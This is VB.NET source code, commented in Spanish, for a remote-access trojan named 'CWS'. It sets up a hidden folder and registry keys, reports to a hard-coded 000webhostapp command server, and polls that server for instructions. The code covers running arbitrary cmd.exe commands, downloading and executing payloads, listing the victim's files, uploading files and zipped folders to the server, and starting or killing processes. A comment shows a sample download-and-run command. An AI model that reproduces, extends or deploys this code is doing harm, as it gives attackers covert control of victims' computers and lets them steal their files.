Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports Microsoft.Win32
Module Globales
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\CWS"
    Public Ident As String = CreateRandomString(9) '9 = 10 chars
    Public HostDomain As String = "https://chemic-jug.000webhostapp.com" 'PARA PRUEBAS
    Public GeneralConfigFileReaderTimeout As Integer = 60000
    Public PrivateConfigFileReaderTimeout As Integer = 60000
End Module
Module General
    Sub Comun()
        Try
            If My.Computer.FileSystem.DirectoryExists(DIRCommons) = False Then
                My.Computer.FileSystem.CreateDirectory(DIRCommons)
            End If
            If My.Computer.FileSystem.DirectoryExists(DIRCommons & "\Others") = True Then
                My.Computer.FileSystem.DeleteDirectory(DIRCommons & "\Others", FileIO.DeleteDirectoryOption.DeleteAllContents)
            End If
            My.Computer.FileSystem.CreateDirectory(DIRCommons & "\Others")
        Catch ex As Exception
            AddToLog("[Comun@General]Error: ", ex.Message, True)
        End Try
    End Sub

    Sub AddToLog(ByVal Header As String, ByVal content As String, Optional ByVal flag As Boolean = False)
        Try
            Dim Overwrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\Registro.log") = True Then
                Overwrite = True
            End If
            Dim LogContent As String = "(" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")"
            If flag = True Then
                LogContent &= "[!!!] " & Header & content
            Else
                LogContent &= Header & content
            End If
            Console.WriteLine(LogContent)
            My.Computer.FileSystem.WriteAllText(DIRCommons & "\Install.log", LogContent & vbCrLf, Overwrite)
        Catch
        End Try
    End Sub
    Function CreateRandomString(ByRef Length As Integer) As String
        Dim str As String = Nothing
        Dim rnd As New Random
        For i As Integer = 0 To Length
            Dim chrInt As Integer = 0
            Do
                chrInt = rnd.Next(30, 122)
                If (chrInt >= 48 And chrInt <= 57) Or (chrInt >= 65 And chrInt <= 90) Or (chrInt >= 97 And chrInt <= 122) Then
                    Exit Do
                End If
            Loop
            str &= Chr(chrInt)
        Next
        Return str
    End Function
End Module
Module Memoria
    Dim RutaBase As String = "Software\\CWS"

    Function IsFirstStart() As Boolean
        'verificar si es o no el primer inicio.
        '   como sabremos si es o no el primer inicio
        '   R: comprobando la existencia de que algo este existiendo.
        '       en este caso, una llave nos lo dira
        Try
            'comprobar la existencia de un archivo
            If My.Computer.FileSystem.FileExists(DIRCommons & "\pienso luego existo.txt") Then
                'si existi y existo.
                Return False
            Else
                'no he existido
                Return True
            End If
        Catch ex As Exception
            AddToLog("[IsFirstStart@Memoria]Error: ", ex.Message, True)
        End Try
        Return False
    End Function

    Sub TheFirstStart()
        Try
            LoadInject() 'obtenemos los datos injectados
            My.Computer.FileSystem.WriteAllText(DIRCommons & "\pienso luego existo.txt", "René Descartes", False) 'doy evidencia de mi existencia

            'guardamos datos unicos
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            If regKey Is Nothing Then
                Registry.CurrentUser.CreateSubKey(RutaBase)
            End If
            regKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            regKey.SetValue("HostDomain", HostDomain)
            regKey.SetValue("Ident", Ident)
            regKey.Close()

            ReportMeToTheServer() 'se reporta al server

            'Process.Start(Application.ExecutablePath)
            'End

            TheSecondStart()
        Catch ex As Exception
            AddToLog("[TheFirstStart@Memoria]Error: ", ex.Message, True)
        End Try
    End Sub
    Sub LoadInject()
        Try
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
            Dim stubb As String = Space(LOF(1))
            Dim FileSplit = "|CWS|"
            FileGet(1, stubb)
            FileClose(1)
            Dim opt() As String = Split(stubb, FileSplit)
            HostDomain = opt(1)
        Catch ex As Exception
            AddToLog("[LoadInject@Memoria]Error: ", ex.Message, True)
        End Try
    End Sub

    Sub TheSecondStart()
        Try

            LoadConfig()
            StartTheThreads()

        Catch ex As Exception
            AddToLog("[TheSecondStart@Memoria]Error: ", ex.Message, True)
        End Try
    End Sub
    Sub SaveConfig()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            If regKey Is Nothing Then
                Registry.CurrentUser.CreateSubKey(RutaBase)
            End If
            regKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            regKey.SetValue("Valor", "Datos")
            regKey.Close()
        Catch ex As Exception
            AddToLog("[SaveConfig@Memoria]Error: ", ex.Message, True)
        End Try
    End Sub
    Sub LoadConfig()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            If regKey Is Nothing Then
                Registry.CurrentUser.CreateSubKey(RutaBase)
            End If
            regKey = Registry.CurrentUser.OpenSubKey(RutaBase, True)
            HostDomain = regKey.GetValue("HostDomain")
            Ident = regKey.GetValue("Ident")
            regKey.Close()
        Catch ex As Exception
            AddToLog("[LoadConfig@Memoria]Error: ", ex.Message, True)
        End Try
    End Sub
End Module
Module Cargas

    Sub DownloadComponent(url As String, fileName As String, IsCompressed As Boolean, RunLater As Boolean, mainFileName As String, Parameters As String)
        'Comando para descargar y ejecutar algo
        '   /Network.DownloadComponent=<link>,<IsCompressed>,<RunLater>,<fileName>,<Parameters>
        '   /Network.DownloadComponent=https://chemic-jug.000webhostapp.com/CWS/hola.py,hola.py,False,True,hola.py,null
        '   link = link de descarga
        '   IsCompressed = boolean, si es un .zip
        '   RunLater = boolean, si despues de descargar/descomprimir se debe ejecutar
        '   fileName = lo que se debe iniciar
        '   Parameters = opciona, iniciar con parametros (en el caso de un ejecutable)
        ' Esto debe ser compatible con el abrir imagenes, archivos y ejecutables.

        Try

            Dim filePath As String = DIRCommons & "\" & fileName

            If My.Computer.FileSystem.FileExists(DIRCommons & "\" & fileName) Then
                My.Computer.FileSystem.DeleteFile(DIRCommons & "\" & fileName)
            End If

            'descargar
            My.Computer.Network.DownloadFile(url, filePath)

            'si es comprimido
            If IsCompressed Then
                ZipFile.ExtractToDirectory(filePath, DIRCommons)
            End If

            'parametros
            If Parameters = "null" Then
                Parameters = Nothing
            End If

            'si se debe ejecutar
            If RunLater Then
                Process.Start(DIRCommons & "\" & mainFileName, Parameters)
            End If
        Catch ex As Exception
            AddToLog("[DownloadComponent@Cargas]Error: ", ex.Message, True)
        End Try
    End Sub
End Module
Module Network
    Dim ThreadGeneralConfig As Threading.Thread
    Dim ThreadPrivateConfig As Threading.Thread
    Dim isGeneralThreadRunning As Boolean = False
    Dim isPrivateThreadRunning As Boolean = False

    Sub ReportMeToTheServer()
        Try
            Dim webRequest As WebRequest = WebRequest.Create(HostDomain & "/CWS/ReportIt.php")
            webRequest.Method = "POST"
            Dim content As String = "# CWS Private " & Ident & " @ " & Environment.UserName &
                vbCrLf & "[Status]" &
                vbCrLf & "IsEnabled=True" &
                vbCrLf & "IsReading=True" &
                vbCrLf & "[Startup]" &
                vbCrLf & "CommandLine=null" &
                vbCrLf & "ArgumentLine=null" &
                vbCrLf & "[Commands]" &
                vbCrLf & "OWN=null" &
                vbCrLf & "CMD=null"
            Dim s As String = "ident=" & Ident & "&log=" & content
            Dim bytes As Byte() = Encoding.UTF8.GetBytes(s)
            webRequest.ContentType = "application/x-www-form-urlencoded"
            webRequest.ContentLength = bytes.Length
            Dim requestStream As Stream = webRequest.GetRequestStream()
            requestStream.Write(bytes, 0, bytes.Length)
            requestStream.Close()
            Dim response As WebResponse = webRequest.GetResponse()
            Console.WriteLine(CType(response, HttpWebResponse).StatusDescription)
            response.Close()
        Catch ex As Exception
            AddToLog("[ReportMeToTheServer@Network]Error: ", ex.Message, True)
        End Try
    End Sub
    Sub StartTheThreads()
        Try
            ThreadGeneralConfig = New Threading.Thread(AddressOf DoTheGeneralConfig)
            ThreadGeneralConfig.Start()
            isGeneralThreadRunning = True
            ThreadPrivateConfig = New Threading.Thread(AddressOf DoThePrivateConfig)
            isPrivateThreadRunning = True
            ThreadPrivateConfig.Start()
        Catch ex As Exception
            AddToLog("[StartTheThreads@Network]Error: ", ex.Message, True)
        End Try
    End Sub
    Sub StopTheThreads()
        Try
            If isGeneralThreadRunning Then
                ThreadGeneralConfig.Abort()
            End If
            If isPrivateThreadRunning Then
                ThreadPrivateConfig.Abort()
            End If
        Catch ex As Exception
            AddToLog("[StopTheThreads@Network]Error: ", ex.Message, True)
        End Try
    End Sub

    Sub DoTheGeneralConfig()
        Try
            While True
                Dim filePath As String = DIRCommons & "\General.ini"
                Dim fileRemotePath As String = HostDomain & "/CWS/General.ini"

                If My.Computer.FileSystem.FileExists(filePath) Then
                    My.Computer.FileSystem.DeleteFile(filePath)
                End If

                'Descargamos el archivo
                My.Computer.Network.DownloadFile(fileRemotePath, filePath)

                Dim IsEnabled_General, IsReading_General, Name_General, Version_General, Download_General, HostDomain_General, GeneralConfigFileReaderTimeout_General, PrivateConfigFileReaderTimeout_General As String

                'Lo leemos
                IsEnabled_General = GetIniValue("Status", "IsEnabled", filePath)
                IsReading_General = GetIniValue("Status", "IsReading", filePath)
                Name_General = GetIniValue("Assembly", "Name", filePath)
                Version_General = GetIniValue("Assembly", "Version", filePath)
                Download_General = GetIniValue("Updates", "Download", filePath)
                HostDomain_General = GetIniValue("Variables", "HostDomain", filePath)
                GeneralConfigFileReaderTimeout_General = GetIniValue("Variables", "GeneralConfigFileReaderTimeout", filePath)
                PrivateConfigFileReaderTimeout_General = GetIniValue("Variables", "PrivateConfigFileReaderTimeout", filePath)

                'Aplicamos
                If IsEnabled_General = True Then
                    If IsReading_General = True Then

                        Dim versionLocal = My.Application.Info.Version
                        Dim versionServidor = New Version(Version_General)
                        Dim resultado = versionLocal.CompareTo(versionServidor)
                        If resultado > 0 Then
                        ElseIf resultado < 0 Then
                            'Actualizacion disponible
                            '   y descargar e instalar
                            'PENDIENTE
                        End If

                        If HostDomain_General <> "null" Then
                            HostDomain = HostDomain_General
                        End If
                        If GeneralConfigFileReaderTimeout_General <> "null" Then
                            GeneralConfigFileReaderTimeout = GeneralConfigFileReaderTimeout_General
                        End If
                        If PrivateConfigFileReaderTimeout_General <> "null" Then
                            PrivateConfigFileReaderTimeout = PrivateConfigFileReaderTimeout_General
                        End If
                    End If
                End If
                Threading.Thread.Sleep(GeneralConfigFileReaderTimeout)
            End While
        Catch ex As Exception
            AddToLog("[DoTheGeneralConfig@Network]Error: ", ex.Message, True)
        End Try
    End Sub
    Sub DoThePrivateConfig()
        Try
            While True
                Dim filePath As String = DIRCommons & "\Private.ini"
                Dim fileRemotePath As String = HostDomain & "/CWS/" & Ident & ".txt"

                If My.Computer.FileSystem.FileExists(filePath) Then
                    My.Computer.FileSystem.DeleteFile(filePath)
                End If

                'Descargamos el archivo
                My.Computer.Network.DownloadFile(fileRemotePath, filePath)

                Dim IsEnabled_Private, IsReading_Private, CommandLine_Private, ArgumentLine_Private, OWN_Private, CMD_Private As String
                IsEnabled_Private = GetIniValue("Status", "IsEnabled", filePath)
                IsReading_Private = GetIniValue("Status", "IsReading", filePath)
                CommandLine_Private = GetIniValue("Startup", "CommandLine", filePath)
                ArgumentLine_Private = GetIniValue("Startup", "ArgumentLine", filePath)
                OWN_Private = GetIniValue("Commands", "OWN", filePath)
                CMD_Private = GetIniValue("Commands", "CMD", filePath)

                'Aplicar
                If IsEnabled_Private = True Then
                    If IsReading_Private = True Then
                        If CommandLine_Private <> "null" Then
                            Process.Start("cmd.exe", CommandLine_Private)
                        End If
                        If ArgumentLine_Private <> "null" Then
                            Process.Start(Application.ExecutablePath, ArgumentLine_Private)
                        End If

                        If OWN_Private <> "null" Then
                            ReadServerCommands(OWN_Private)
                        End If

                    End If
                End If

                Threading.Thread.Sleep(PrivateConfigFileReaderTimeout)
            End While
        Catch ex As Exception
            AddToLog("[DoThePrivateConfig@Network]Error: ", ex.Message, True)
        End Try
    End Sub

    Sub ReadServerCommands(ByVal raw_command As String)
        Try
            'Procesar el comando
            Dim Comando As String = raw_command
            Dim ContenidoComando As String = Comando
            Dim ComandoArgumentos() As String
            If ContenidoComando.Contains("=") Then
                ContenidoComando = ContenidoComando.Remove(0, ContenidoComando.LastIndexOf("=") + 1)
                ComandoArgumentos = ContenidoComando.Split(",")
            End If

            If Comando.StartsWith("/Network.DownloadComponent=") Then
                DownloadComponent(ComandoArgumentos(0), ComandoArgumentos(1), ComandoArgumentos(2), ComandoArgumentos(3), ComandoArgumentos(4), ComandoArgumentos(5))
                SendTheResponse("Descarga de complemento" &
                    vbCrLf & "      url: " & ComandoArgumentos(0) &
                    vbCrLf & "      fileName: " & ComandoArgumentos(1) &
                    vbCrLf & "      isCompressed: " & ComandoArgumentos(2) &
                    vbCrLf & "      RunLater: " & ComandoArgumentos(3) &
                    vbCrLf & "      mainFileName: " & ComandoArgumentos(4) &
                    vbCrLf & "      Parameters: " & ComandoArgumentos(5))
            ElseIf Comando.StartsWith("/FileSystem.GetFiles=") Then
                Dim archivos As String = ContenidoComando & vbCrLf
                For Each file As String In My.Computer.FileSystem.GetFiles(ContenidoComando)
                    archivos &= file & vbCrLf
                Next
                SendTheResponse(archivos)
            ElseIf Comando.StartsWith("/FileSystem.GetDirectories=") Then
                Dim carpeta As String = ContenidoComando & vbCrLf
                For Each folder As String In My.Computer.FileSystem.GetDirectories(ContenidoComando)
                    carpeta &= folder & vbCrLf
                Next
                SendTheResponse(carpeta)
            ElseIf Comando.StartsWith("/Network.GetFile=") Then
                Dim finalFileName As String = DIRCommons & "\Others\" & IO.Path.GetFileNameWithoutExtension(ContenidoComando) & "_" & Ident & IO.Path.GetExtension(ContenidoComando) 'asd_<ident>.txt
                If My.Computer.FileSystem.FileExists(finalFileName) Then
                    My.Computer.FileSystem.DeleteFile(finalFileName)
                End If
                My.Computer.FileSystem.CopyFile(ContenidoComando, finalFileName)
                My.Computer.Network.UploadFile(finalFileName, HostDomain & "/CWS/fileUpload.php")
                SendTheResponse("Enviar archivo")
            ElseIf Comando.StartsWith("/Network.GetFolder=") Then
                Dim zipFileName As String = DIRCommons & "\Others\"
                zipFileName &= IO.Path.GetFileNameWithoutExtension(ContenidoComando) & "_" & Ident & ".zip"
                ZipFile.CreateFromDirectory(ContenidoComando, zipFileName, CompressionLevel.Fastest, true)
                My.Computer.Network.UploadFile(zipFileName, HostDomain & "/CWS/fileUpload.php")
                SendTheResponse("Enviar carpeta")
            ElseIf Comando.StartsWith("/Process.Start=") Then
                Process.Start(ComandoArgumentos(0), ComandoArgumentos(1))
                SendTheResponse("Iniciar proceso")
            ElseIf Comando.StartsWith("/Process.Stop=") Then
                Dim pProcess() As Process = System.Diagnostics.Process.GetProcessesByName(ContenidoComando)
                For Each p As Process In pProcess
                    p.Kill()
                Next
                SendTheResponse("Detener proceso")
            ElseIf Comando.StartsWith("/Stop") Then
                SendTheResponse("Llamado a cerrar")
                End
            End If
        Catch ex As Exception
            AddToLog("[ReadServerCommands@Network]Error: ", ex.Message, True)
        End Try
    End Sub

    Sub SendTheResponse(ByVal cmdResponse As String)
        Try
            Dim webRequest As WebRequest = WebRequest.Create(HostDomain & "/CWS/cliResponse.php")
            webRequest.Method = "POST"
            Dim content As String = "# CWS Private " & Ident & " @ " & Environment.UserName &
            vbCrLf & "[Status]" &
                vbCrLf & "IsEnabled=True" &
                vbCrLf & "IsReading=True" &
                vbCrLf & "[Startup]" &
                vbCrLf & "CommandLine=null" &
                vbCrLf & "ArgumentLine=null" &
                vbCrLf & "[Commands]" &
                vbCrLf & "OWN=null" &
                vbCrLf & "CMD=null" &
                vbCrLf & "[Response]" &
                vbCrLf & cmdResponse
            Dim s As String = "ident=" & Ident & "&log=" & content
            Dim bytes As Byte() = Encoding.UTF8.GetBytes(s)
            webRequest.ContentType = "application/x-www-form-urlencoded"
            webRequest.ContentLength = bytes.Length
            Dim requestStream As Stream = webRequest.GetRequestStream()
            requestStream.Write(bytes, 0, bytes.Length)
            requestStream.Close()
            Dim response As WebResponse = webRequest.GetResponse()
            Console.WriteLine(CType(response, HttpWebResponse).StatusDescription)
            response.Close()
        Catch ex As Exception
            AddToLog("[SendTheResponse@Network]Error: ", ex.Message, True)
        End Try
    End Sub
End Module
Module Complementos
    <DllImport("kernel32")>
    Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
    End Function

    Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = "") As String
        Dim sb As New StringBuilder(500)
        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
            Return sb.ToString
        Else
            Return defaultValue
        End If
    End Function
End Module